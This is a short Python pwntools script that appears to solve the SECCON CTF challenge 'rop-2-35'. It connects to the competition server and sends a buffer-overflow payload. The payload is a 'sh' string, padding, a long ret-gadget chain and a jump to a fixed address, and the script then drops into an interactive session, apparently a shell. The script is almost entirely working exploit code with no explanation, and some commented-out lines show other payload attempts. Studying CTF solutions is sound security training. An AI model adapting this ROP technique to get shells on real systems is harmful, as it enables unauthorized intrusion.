from pwn import *

#io = process('./chall')
io = remote('rop-2-35.seccon.games', 9999)



#gdb.attach(io)
pl = b'sh\0'+b'a'*0x15
pl += p64(0x000000000040101a)*0x50*2
pl += p64(0x0000000000401169)
#pl += p64(0x40113d)
#pl += p64(0x404500)
#pl += p64(0x401171)

io.sendline(pl)

#pl = b'\0'*0x18
#pl += b'/bin/sh\0'
#pl += p64()

io.interactive()